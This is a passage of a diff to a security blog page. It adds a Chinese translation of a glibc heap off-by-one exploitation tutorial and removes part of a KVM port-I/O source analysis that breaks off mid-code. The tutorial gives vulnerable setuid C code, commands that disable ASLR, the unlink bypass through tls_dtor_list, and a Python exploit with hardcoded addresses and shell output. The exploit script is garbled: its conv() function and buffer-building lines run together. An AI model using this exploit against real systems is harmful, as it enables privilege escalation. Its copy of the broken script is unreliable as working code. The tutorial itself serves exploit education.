@@ -108,6 +108,133 @@
         
           <section id="main">
   
+    <article id="post-heap-offbyone"  class="article article-type-post" itemscope itemprop="blogPost" >
+  <div id="articleInner" class="clearfix post-1016 post type-post status-publish format-standard has-post-thumbnail hentry category-template-2 category-uncategorized tag-codex tag-edge-case tag-featured-image tag-image tag-template">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="thumb" itemprop="name">
+      <a class="article-title" href="/20170104/heap-offbyone/">堆内off-by-one漏洞利用</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-meta">
+      
+	Posted on <a href="/20170104/heap-offbyone/" class="article-date">
+	  <time datetime="2017-01-04T14:35:27.000Z" itemprop="datePublished">一月 4, 2017</time>
+	</a>
+
+    </div>
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>作者: <a href="http://www.csyssec.org/about" target="_blank" rel="external">CSysSec出品</a></p>
+<hr>
+<p><strong>CSysSec注</strong>： 本系列文章译自安全自由工作者<a href="https://sploitfun.wordpress.com/about-2/" target="_blank" rel="external">Sploitfun</a>的漏洞利用系列博客，从经典栈缓冲区漏洞利用堆漏洞利用，循序渐进，是初学者不可多得的好材料，本系列所有文章涉及的源码可以在<a href="https://github.com/sploitfun/lsploits" target="_blank" rel="external">这里</a>找到。CSysSec计划在原基础上不断添加相关漏洞利用技术以及相应的Mitigation方法，欢迎推荐或自荐文章。<br><strong>转载本文请务必注明</strong>，文章出处：《<a href="http://www.csyssec.org/20170104/heap-offbyone" target="_blank" rel="external">Linux(X86)漏洞利用系列-Unlink堆溢出)</a>》与作者信息：<a href="http://www.csyssec.org/about/" target="_blank" rel="external">CSysSec出品</a></p>
+<hr>
+<blockquote>
+<ul>
+<li>0X01 什么是off-by-one漏洞</li>
+<li>0X02 如何做到任意代码执行</li>
+<li>0X03 为什么不是prev_size的最小影响字节(LSB)被覆盖</li>
+<li>0X04 覆盖tls_dtor_list</li>
+<li>0X05 为什么没能获取root shell</li>
+</ul>
+</blockquote>
+<p><u>阅读基础</u>:<br>    <a href="http://www.csyssec.org/20161231/stackoffbyone/" target="_blank" rel="external">栈内off-by-one漏洞</a><br>    <a href="http://www.csyssec.org/20170104/glibcmalloc/" target="_blank" rel="external">深入理解glibc malloc</a></p>
+<p><u>VM Setup</u>: Fedora 20(x86)</p>
+<h3 id="0X01-什么是off-by-one漏洞"><a href="#0X01-什么是off-by-one漏洞" class="headerlink" title="0X01 什么是off-by-one漏洞"></a>0X01 什么是off-by-one漏洞</h3><p>在<a href="http://www.csyssec.org/20161231/stackoffbyone/" target="_blank" rel="external">这篇</a>文中说过，当将源字符串拷贝到目的字符串时出现下述情况可能会发生off-by-one</p>
+<ul>
+<li>源字符串长度等于目的字符串长度</li>
+</ul>
+<p>当源字符串长度等于目的字符串长度时，单个NULL字节会被拷贝到目的字符串中。这里由于目的字符串处于堆中，单个NULL字节可以覆盖下一个chunk的头部信息,从而导致任意代码执行。</p>
+<p><u>扼要重述</u>：在<a href="http://www.csyssec.org/20170104/glibcmalloc/" target="_blank" rel="external">这篇</a>文中说过，堆根据每个用户对堆内存的请求，被分为多个chunk.每个chunk有自己的chunk头部信息(由<a href="https://github.com/sploitfun/lsploits/blob/master/glibc/malloc/malloc.c#L1108" target="_blank" rel="external">malloc_chunk</a>表示)。 结构体malloc_chunk含有以下四个域：</p>
+<ul>
+<li>1.prev_size - 若前一个chunk空闲，则prev_size域包含前一个chunk的大小信息；若前一个chunk已经被分配，则这个域包含前一个chunk的用户数据</li>
+<li>2.size: size域含有这个已经分配的chunk。域的后3比特含有flag信息。<ul>
+<li><a href="https://github.com/sploitfun/lsploits/blob/master/glibc/malloc/malloc.c#L1267" target="_blank" rel="external">PREV_INUSE(P)</a>- 当前一个chunk被分配时，此位被设置</li>
+<li><a href="https://github.com/sploitfun/lsploits/blob/master/glibc/malloc/malloc.c#L1274" target="_blank" rel="external">IS_MMAPPED(M)</a>- 当chunk被mmap了，此位被设置。</li>
+<li><a href="https://github.com/sploitfun/lsploits/blob/master/glibc/malloc/malloc.c#L1283" target="_blank" rel="external">NON_MAIN_ARENA(N)</a>- 当这个chunk属于一个线程arena时，此位被设置。</li>
+</ul>
+</li>
+<li>3.fd- 指向同一个bin中的下一个chunk</li>
+<li>4.bk- 指向同一个bin中的前一个chunk</li>
+</ul>
+<p><u>漏洞代码</u>:</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div></pre></td><td class="code"><pre><div class="line"><span class="comment">//consolidate_forward.c</span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></div><div class="line"></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> SIZE 16</span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span></span></div><div class="line">&#123;</div><div class="line"></div><div class="line"> <span class="keyword">int</span> fd = open(<span class="string">"./inp_file"</span>, O_RDONLY); <span class="comment">/* [1] */</span></div><div class="line"> <span class="keyword">if</span>(fd == <span class="number">-1</span>) &#123;</div><div class="line"> <span class="built_in">printf</span>(<span class="string">"File open error\n"</span>);</div><div class="line"> fflush(<span class="built_in">stdout</span>);</div><div class="line"> <span class="built_in">exit</span>(<span class="number">-1</span>);</div><div class="line"> &#125;</div><div class="line"></div><div class="line"> <span class="keyword">if</span>(<span class="built_in">strlen</span>(argv[<span class="number">1</span>])&gt;<span class="number">1020</span>) &#123; <span class="comment">/* [2] */</span></div><div class="line"> <span class="built_in">printf</span>(<span class="string">"Buffer Overflow Attempt. Exiting...\n"</span>);</div><div class="line"> <span class="built_in">exit</span>(<span class="number">-2</span>);</div><div class="line"> &#125;</div><div class="line"></div><div class="line"> <span class="keyword">char</span>* tmp = <span class="built_in">malloc</span>(<span class="number">20</span><span class="number">-4</span>); <span class="comment">/* [3] */</span></div><div class="line"> <span class="keyword">char</span>* p = <span class="built_in">malloc</span>(<span class="number">1024</span><span class="number">-4</span>); <span class="comment">/* [4] */</span></div><div class="line"> <span class="keyword">char</span>* p2 = <span class="built_in">malloc</span>(<span class="number">1024</span><span class="number">-4</span>); <span class="comment">/* [5] */</span></div><div class="line"> <span class="keyword">char</span>* p3 = <span class="built_in">malloc</span>(<span class="number">1024</span><span class="number">-4</span>); <span class="comment">/* [6] */</span></div><div class="line"></div><div class="line"> read(fd,tmp,SIZE); <span class="comment">/* [7] */</span></div><div class="line"> <span class="built_in">strcpy</span>(p2,argv[<span class="number">1</span>]); <span class="comment">/* [8] */</span></div><div class="line"></div><div class="line"> <span class="built_in">free</span>(p); <span class="comment">/* [9] */</span></div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<p><u>编译命令</u>:</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#echo 0 &gt; /proc/sys/kernel/randomize_va_space</span></div><div class="line">$gcc -o consolidate_forward consolidate_forward.c</div><div class="line">$sudo chown root consolidate_forward</div><div class="line">$sudo chgrp root consolidate_forward</div><div class="line">$sudo chmod +s consolidate_forward</div></pre></td></tr></table></figure>
+<p><u>注意</u>: 为了更好演示，已经关闭ASLR。如果你也想绕过ASLR，可以利用<a href="http://www.csyssec.org/20170104/useafterfree/" target="_blank" rel="external">这篇文章</a>提到的信息泄露漏洞或暴力破解技术<br>。</p>
+<p><strong>注：本系列所有文章中第[N]行代码指的的代码中显示/*[N]*/的位置。</strong></p>
+<p>上述漏洞程序的第[2]和[8]行就是堆中off-by-one溢出可能发生的地方。目的缓冲区的长度是1020，因此源缓冲区长度也是1020的话就会导致任意代码执行。</p>
+<h3 id="0X02-如何做到任意代码执行"><a href="#0X02-如何做到任意代码执行" class="headerlink" title="0X02 如何做到任意代码执行"></a>0X02 如何做到任意代码执行</h3><p>当单NULL字节覆盖下一个chunk(‘p3’)的chunk头部信息时就会发生任意代码执行。当1020字节的chunk(‘p2’)被单字节溢出时，是下一个chunk(‘p3’)头部大小的最小影响字节(Least Significant Byte)-(而不是prev_size的最小影响字节)被NULL字节覆盖。</p>
+<h3 id="0X03-为什么不是prev-size的最小影响字节-LSB-被覆盖"><a href="#0X03-为什么不是prev-size的最小影响字节-LSB-被覆盖" class="headerlink" title="0X03 为什么不是prev_size的最小影响字节(LSB)被覆盖"></a>0X03 为什么不是prev_size的最小影响字节(LSB)被覆盖</h3><p>由于需要额外的空间来存储malloc_chunk以及为了对其的目的，<a href="https://github.com/sploitfun/lsploits/blob/master/glibc/malloc/malloc.c#L1254" target="_blank" rel="external">checked_request2size</a>将用户需求的大小转化为可用的大小(内部表示字节大小-internal representation size)。当可用大小的最后3个比特都没有被设置时会发生这种转化，这3个比特用来存储flag信息 P,M与N。</p>
+<p>上漏洞代码执行到malloc(1020)时，1020字节的用户需求大小被转化为((1020 + 4 + 7) &amp; ~7) 1024字节(内部表示字节大小)。分配1020字节的chunk开销只要4字节。但对于一个分配的chunk我们却需要8字节的chunk头部信息用来存储prev_size和size信息。1024字节的chunk前8个字节用作chunk头部信息，但现在只剩下1016（1024-8）字节（而不是1020字节)用来存储用户数据。如上面说的prev_size的定义，如果前一个chunk(‘p2’)被分配，chunk(‘p3’)的prev_size域含有用户数据。chunk(‘p3’)的prev_size紧邻已经分配的chunk(‘p2’)，其含有用户数据剩下的4字节。这就是为什么size(而不是pre_size)的LSB被但NULL字节覆盖的原因了。</p>
+<p><u>堆布局</u>:</p>
+<figure><br>    <a href="http://oij0laovn.bkt.clouddn.com/heapoffbyone1.png" target="_blank" rel="external"><img src="http://oij0laovn.bkt.clouddn.com/heapoffbyone1.png" width="450"></a><br>    <figcaption></figcaption><br></figure>
+
+
+<p><u>注意</u>: 上图中的攻击者数据指的是下文中提到的”覆盖 tls_dtor_list”</p>
+<p>现在回到我们一开始的问题</p>
+<pre><code>如何做到任意代码执行
+</code></pre><p>现在我们已经知道在off-by-one漏洞中，单NULL字节覆盖下一个chunk(‘p3’) size域的LSB。单NULL字节覆盖意味着chunk(‘p3’)的flag信息被清除了。 被覆盖的chunk(‘p2’)尽管处于已经被分配的状态，现在却变得空闲了。当在溢出的chunk (‘p2)前的(‘p’)被释放时，这种状态不一致性驱使glibc去unlink 已经处于分配状态的chunk(‘p2’)  </p>
+<p>在<a href="http://www.csyssec.org/20170104/heapoverflow-unlink/" target="_blank" rel="external">这篇</a>文章中，由于任何四字节的内存区域都能被写上攻击者的数据，unlink一个已经在分配状态的chunk会导致任意代码执行<br>！！ 在同一篇文中，我们也知道由于glibc近些年的被强化，unlink技术已经过时了！ 尤其是当<a href="https://github.com/sploitfun/lsploits/blob/master/glibc/malloc/malloc.c#L1414" target="_blank" rel="external">“损坏的双链表”</a>这个条件成立时，任意代码执行是不可能的。</p>
+<p>在2014年后期，<a href="http://googleprojectzero.blogspot.in/2014/08/the-poisoned-nul-byte-2014-edition.html" target="_blank" rel="external"> google’s project zero team</a>发现一种通过unlink一个大的chunk(large chunk)的方法，可以成功绕过”损坏的双链表”条件。</p>
+<p><u>Unlink</u>:</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">define</span> unlink(P, BK, FD) &#123; </span></div><div class="line">  FD = P-&gt;fd; </div><div class="line">  BK = P-&gt;bk;</div><div class="line">  <span class="comment">// Primary circular double linked list hardening - Run time check</span></div><div class="line">  <span class="keyword">if</span> (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, <span class="number">0</span>)) <span class="comment">/* [1] */</span></div><div class="line">   malloc_printerr (check_action, <span class="string">"corrupted double-linked list"</span>, P); </div><div class="line">  <span class="keyword">else</span> &#123; </div><div class="line">   <span class="comment">// If we have bypassed primary circular double linked list hardening, below two lines helps us to overwrite any 4 byte memory region with arbitrary data!!</span></div><div class="line">   FD-&gt;bk = BK; <span class="comment">/* [2] */</span></div><div class="line">   BK-&gt;fd = FD; <span class="comment">/* [3] */</span></div><div class="line">   <span class="keyword">if</span> (!in_smallbin_range (P-&gt;size) </div><div class="line">   &amp;&amp; __builtin_expect (P-&gt;fd_nextsize != <span class="literal">NULL</span>, <span class="number">0</span>)) &#123; </div><div class="line">    <span class="comment">// Secondary circular double linked list hardening - Debug assert</span></div><div class="line">    assert (P-&gt;fd_nextsize-&gt;bk_nextsize == P);  <span class="comment">/* [4] */</span></div><div class="line">        assert (P-&gt;bk_nextsize-&gt;fd_nextsize == P); <span class="comment">/* [5] */</span></div><div class="line">    <span class="keyword">if</span> (FD-&gt;fd_nextsize == <span class="literal">NULL</span>) &#123; </div><div class="line">     <span class="keyword">if</span> (P-&gt;fd_nextsize == P) </div><div class="line">      FD-&gt;fd_nextsize = FD-&gt;bk_nextsize = FD; </div><div class="line">     <span class="keyword">else</span> &#123; </div><div class="line">      FD-&gt;fd_nextsize = P-&gt;fd_nextsize; </div><div class="line">      FD-&gt;bk_nextsize = P-&gt;bk_nextsize; </div><div class="line">      P-&gt;fd_nextsize-&gt;bk_nextsize = FD; </div><div class="line">      P-&gt;bk_nextsize-&gt;fd_nextsize = FD; </div><div class="line">     &#125; </div><div class="line">    &#125; <span class="keyword">else</span> &#123; </div><div class="line">     <span class="comment">// If we have bypassed secondary circular double linked list hardening, below two lines helps us to overwrite any 4 byte memory region with arbitrary data!!</span></div><div class="line">     P-&gt;fd_nextsize-&gt;bk_nextsize = P-&gt;bk_nextsize; <span class="comment">/* [6] */</span></div><div class="line">     P-&gt;bk_nextsize-&gt;fd_nextsize = P-&gt;fd_nextsize; <span class="comment">/* [7] */</span></div><div class="line">    &#125; </div><div class="line">   &#125; </div><div class="line">  &#125; </div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<p>在glibc malloc中，主环形双链表由malloc_chunk的fs和bk域来维护，而次环形双链表由malloc_chunk的fd_nextsize和bk_nextsize域来维护。这看起来像是损坏的双链表hardening被应用到了主环形双链表(第[1]行)和次环形双链表中(第[4],[5]行)，但次要环形双链表的hardening仅仅是一个debug assert语句(不像是主环形双链表hardening会在运行时进行检查)，它最终并不会编译到产品中(至少在fedora是这样的)。次要环形双链表的强化(hardening)（第[4],[5]行)并没有什么意义，这可以让我们在4字节的内存区域中写任何数据(第[6],[7]行)。</p>
+<p>任然还有一些东西要讲明白一些。我们来看看如何通过unlink一个大的chunk来做到任意代码执行的细节！ 现在攻击者已经控制住即将要被释放的大chunk，他以下方式覆盖malloc_chunk中的域：</p>
+<ul>
+<li>fd必须指回到已经被释放的chunk地址来绕过主环形双链表的hardening</li>
+<li>bk也必须指回到已经被释放的chunk地址来绕过主环形双链表的hardening</li>
+<li>fd_nextsize 必须指向 free_got_addr -0x14</li>
+<li>bk_nextsize 必须指向system_addr</li>
+</ul>
+<p>但第[6],[7]行需要fd_nextsize和bk_nextsize是可写的。fd_nextsize指向 free_got_addr -0x14，所以它是可写的。但bk_nextsize指向system_addr，这属于libc.so的text段区域，所以它是不可写的。要让fd_nextsize和bk_nextsize同时可写，需要覆盖tls_dtor_list</p>
+<h3 id="0X04-覆盖tls-dtor-list"><a href="#0X04-覆盖tls-dtor-list" class="headerlink" title="0X04 覆盖tls_dtor_list"></a>0X04 覆盖tls_dtor_list</h3><p><a href="">tls_dtor_list</a>是一个线程本地变量，含有一个函数指针列表，在执行exit()时会被调用。 <a href=""> __call_tls_dtors]()遍历tls_dtor_list并一个一个调用其中的函数！！ 所以如果我们能利用一个含有system和system_arg的堆地址覆盖tls_dtor_list，来替换dtor_list</a>中的func和obj， system()就能被调用。</p>
+<figure><br>    <a href="http://oij0laovn.bkt.clouddn.com/heapoffbyone2.png" target="_blank" rel="external"><img src="http://oij0laovn.bkt.clouddn.com/heapoffbyone2.png" width="450"></a><br>    <figcaption></figcaption><br></figure>
+
+<p>现在攻击者通过以下方式覆盖即将要释放的大chunk中的malloc_chunk里面的域信息：</p>
+<ul>
+<li>fd必须指回到已经被释放的chunk地址来绕过主环形双链表的hardening</li>
+<li>bk也必须指回到已经被释放的chunk地址来绕过主环形双链表的hardening</li>
+<li>fd_nextsize 必须指向 tls_dtor_list -0x14</li>
+<li>bk_nextsize 必须指向含有dtor_list元素的堆地址</li>
+</ul>
+<p>让fd_nextsize变成可写的问题解决了。那是因为tls_dtor_list属于libc.so的可写段，并且通过反汇编_call_tls_dtors()，可以得到tls_dtor_list的地址是0xb7fe86d4</p>
+<p>由于bk_nextsize指向堆地址，让它变成可写的问题也解决了。</p>
+<p>利用所有这些信息，我们可以写个漏洞利用程序来攻击’consolidate_forward’了！！</p>
+<p><u>漏洞利用代码</u>:</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div></pre></td><td class="code"><pre><div class="line">#exp_try.py</div><div class="line">#!/usr/bin/env python</div><div class="line"><span class="keyword">import</span> <span class="keyword">struct</span></div><div class="line">from subprocess <span class="keyword">import</span> call</div><div class="line"></div><div class="line">fd = <span class="number">0x0804b418</span></div><div class="line">bk = <span class="number">0x0804b418</span></div><div class="line">fd_nextsize = <span class="number">0xb7fe86c0</span></div><div class="line">bk_nextsize = <span class="number">0x804b430</span></div><div class="line">system = <span class="number">0x4e0a86e0</span></div><div class="line">sh = <span class="number">0x80482ce</span></div><div class="line"></div><div class="line">#endianess convertion</div><div class="line">def conv(num):</div><div class="line"> <span class="keyword">return</span> <span class="keyword">struct</span>.pack(<span class="string">"&lt;I"</span>,num(fd)</div><div class="line">buf += conv(bk)</div><div class="line">buf += conv(fd_nextsize)</div><div class="line">buf += conv(bk_nextsize)</div><div class="line">buf += conv(system)</div><div class="line">buf += conv(sh)</div><div class="line">buf += <span class="string">"A"</span> * <span class="number">996</span></div><div class="line"></div><div class="line">print <span class="string">"Calling vulnerable program"</span></div><div class="line">call([<span class="string">"./consolidate_forward"</span>, buf])</div></pre></td></tr></table></figure>
+<p>执行上述漏洞利用代码，并不能给我们root shell。它只能提供运行在我们自己权限上的bash shell。 </p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">$ python -c 'print "A"*16' &gt; inp_file</div><div class="line">$ python exp_try.py </div><div class="line">Calling vulnerable program</div><div class="line">sh-4.2$ id</div><div class="line">uid=1000(sploitfun) gid=1000(sploitfun) groups=1000(sploitfun),10(wheel) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023</div><div class="line">sh-4.2$ exit</div><div class="line">exit</div><div class="line">$</div></pre></td></tr></table></figure>
+<h3 id="0X05-为什么没能获取root-shell"><a href="#0X05-为什么没能获取root-shell" class="headerlink" title="0X05 为什么没能获取root shell"></a>0X05 为什么没能获取root shell</h3><p>当uid!=euid时，/bin/bash会丢弃权限。我们的二进制文件’consolidate _forward’的真实uid=1000，有效uid=0。 由于真实uid!=有效uid，因此当system() 被调用时，bash会丢弃权限。为了解决这个问题，我们需要在执行system()之前调用setuid(0)，由于_call_tls_dtors遍历tls_dtor_list并一个一个调用其中的函数，我们需要链接setuid()和system()</p>
+<hr>
+<p><strong>转载本文请务必注明</strong>，文章出处：《<a href="http://www.csyssec.org/20170104/heap-offbyone" target="_blank" rel="external">Linux(X86)漏洞利用系列-Unlink堆溢出)</a>》与作者信息：<a href="http://www.csyssec.org/about/" target="_blank" rel="external">CSysSec出品</a></p>
+
+      
+    </div>
+    <footer class="entry-meta entry-footer">
+      
+	<span class="ico-folder"></span>
+    <a class="article-category-link" href="/categories/漏洞利用/">漏洞利用</a>
+
+      
+  <span class="ico-tags"></span>
+  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Exploit/">Exploit</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Heap/">Heap</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Security/">Security</a></li></ul>
+
+      
+    </footer>
+  </div>
+  
+</article>
+
+<!-- Table of Contents -->
+
+  
     <article id="post-glibcmalloc"  class="article article-type-post" itemscope itemprop="blogPost" >
   <div id="articleInner" class="clearfix post-1016 post type-post status-publish format-standard has-post-thumbnail hentry category-template-2 category-uncategorized tag-codex tag-edge-case tag-featured-image tag-image tag-template">
     
@@ -678,145 +805,6 @@ cd kbeast-v1
 <!-- Table of Contents -->
 
   
-    <article id="post-kvmsource-io"  class="article article-type-post" itemscope itemprop="blogPost" >
-  <div id="articleInner" class="clearfix post-1016 post type-post status-publish format-standard has-post-thumbnail hentry category-template-2 category-uncategorized tag-codex tag-edge-case tag-featured-image tag-image tag-template">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 class="thumb" itemprop="name">
-      <a class="article-title" href="/20170104/kvmsource-io/">KVM源码分析之IO虚拟化之PIO</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="article-meta">
-      
-	Posted on <a href="/20170104/kvmsource-io/" class="article-date">
-	  <time datetime="2017-01-04T05:52:09.000Z" itemprop="datePublished">一月 4, 2017</time>
-	</a>
-
-    </div>
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p>作者：<a href="http://www.oenhan.com/about" target="_blank" rel="external">Oen Han</a></p>
-<hr>
-<p><strong>CSysSec注</strong>： 本KVM源码分析系列文章来自系Intel中国Linux内核与虚拟化开发工程师Oen Han的<a href="http://www.oenhan.com/kvm-src-5-io-pio" target="_blank" rel="external">博客</a>,Oen Han 在虚拟化领域有丰富的开发经验，其写的KVM源码分析系列是本人目前见过最好最详细的，值得推荐。<br><strong>转载本文请务必注明</strong>，文章出处：《<a href="http://www.csyssec.org/20170104/kvmsource-io/" target="_blank" rel="external">KVM源码分析之IO虚拟化之PIO</a>》及原作者信息:<a href="http://www.oenhan.com/about" target="_blank" rel="external">Oen Han</a></p>
-<hr>
-<blockquote>
-<ul>
-<li>0X01 PIO指令介绍</li>
-<li>0X02 PIO运行在KVM</li>
-<li>0X03 PIO运行在QEMU</li>
-</ul>
-</blockquote>
-<p>源代码:git tag, kernel v3.16.37 qemu v2.7 ，上一篇：KVM源代码分析4:内存虚拟化–OenHan</p>
-<h3 id="0X01-PIO指令介绍"><a href="#0X01-PIO指令介绍" class="headerlink" title="0X01 PIO指令介绍"></a>0X01 PIO指令介绍</h3><p>80386的I/O指令使得处理器可以访问I/O端口，以便从外设输入数据，或者向外设发送数据。这些指令有一个指定I/O空间端口地址的操作数。有两类的I/O指令：</p>
-<ul>
-<li><p>1、 在寄存器指定的地址传送一个数据（字节、字、双字）。</p>
-</li>
-<li><p>2、 传送指定内存中的一串数据（字节串、字串、双字串）。这些被称作为“串 I/O指令”或者说“块I/O指令”。</p>
-</li>
-</ul>
-<p>有IN/OUT INS/OUTS指令</p>
-<h3 id="0X02-PIO运行在KVM"><a href="#0X02-PIO运行在KVM" class="headerlink" title="0X02 PIO运行在KVM"></a>0X02 PIO运行在KVM</h3><p>当guest执行PIO指令时，触发vmx_handle_exit，根据EXIT_REASON_IO_INSTRUCTION执行handle_io函数，根据sdm 3 27.5图表：</p>
-<table>
-<thead>
-<tr>
-<th>Bit Position(s) Contents</th>
-<th>Contents</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td>2:0</td>
-<td>Size of access：0 = 1-byte 1 = 2-byte 3 = 4-byte Other values not used</td>
-</tr>
-<tr>
-<td>3</td>
-<td>Direction of the attempted access (0 = OUT, 1 = IN)</td>
-</tr>
-<tr>
-<td>4</td>
-<td>String instruction (0 = not string; 1 = string)</td>
-</tr>
-<tr>
-<td>5</td>
-<td>REP prefixed (0 = not REP; 1 = REP)</td>
-</tr>
-<tr>
-<td>6</td>
-<td>Operand encoding (0 = DX, 1 = immediate)</td>
-</tr>
-<tr>
-<td>15:7</td>
-<td>Reserved (cleared to 0)</td>
-</tr>
-<tr>
-<td>31:16</td>
-<td>Port number (as specified in DX or in an immediate operand)</td>
-</tr>
-<tr>
-<td>63:32</td>
-<td>Reserved (cleared to 0). These bits exist only on processors that support Intel 64 architecture.</td>
-</tr>
-</tbody>
-</table>
-<p>在handle_io中，如果</p>
-<figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">string</span> = (exit_qualification &amp; <span class="number">16</span>) != <span class="number">0</span>;</div><div class="line"></div><div class="line">in = (exit_qualification &amp; <span class="number">8</span>) != <span class="number">0</span>;</div><div class="line"></div><div class="line"><span class="comment">// string串指令或者IO读的指令进行处理</span></div><div class="line"></div><div class="line"><span class="keyword">if</span> (<span class="built_in">string</span> || in)</div><div class="line"></div><div class="line"><span class="keyword">return</span> emulate_instruction(vcpu, <span class="number">0</span>) == EMULATE_DONE;</div><div class="line"></div><div class="line">port = exit_qualification &gt;&gt; <span class="number">16</span>;</div><div class="line"></div><div class="line">size = (exit_qualification &amp; <span class="number">7</span>) + <span class="number">1</span>;</div><div class="line"></div><div class="line"><span class="comment">//跳过模拟指令，将非串写指令参数保存</span></div><div class="line"></div><div class="line">skip_emulated_instruction(vcpu);</div><div class="line"></div><div class="line"><span class="keyword">return</span> kvm_fast_pio_out(vcpu, size, port);</div></pre></td></tr></table></figure>
-<p>先看kvm_fast_pio_out函数</p>
-<figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> val = kvm_register_read(vcpu, VCPU_REGS_RAX);</div><div class="line"></div><div class="line"><span class="keyword">int</span> ret = emulator_pio_out_emulated(&amp;vcpu-&gt;arch.emulate_ctxt,</div><div class="line"></div><div class="line">   size, port, &amp;val, <span class="number">1</span>);</div></pre></td></tr></table></figure>
-<p>pio指令对象放在eax里面，在emulator_pio_out_emulated中</p>
-<figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div></pre></td><td class="code"><pre><div class="line"></div><div class="line"><span class="built_in">memcpy</span>(vcpu-&gt;arch.pio_data, val, size * count);    </div><div class="line"></div><div class="line">vcpu-&gt;arch.pio.port = port;</div><div class="line"></div><div class="line">vcpu-&gt;arch.pio.in = in;</div><div class="line"></div><div class="line">vcpu-&gt;arch.pio.count  = count;</div><div class="line"></div><div class="line">vcpu-&gt;arch.pio.size = size;</div><div class="line"></div><div class="line"><span class="keyword">if</span> (!kernel_pio(vcpu, vcpu-&gt;arch.pio_data)) &#123;</div><div class="line"></div><div class="line">vcpu-&gt;arch.pio.count = <span class="number">0</span>;</div><div 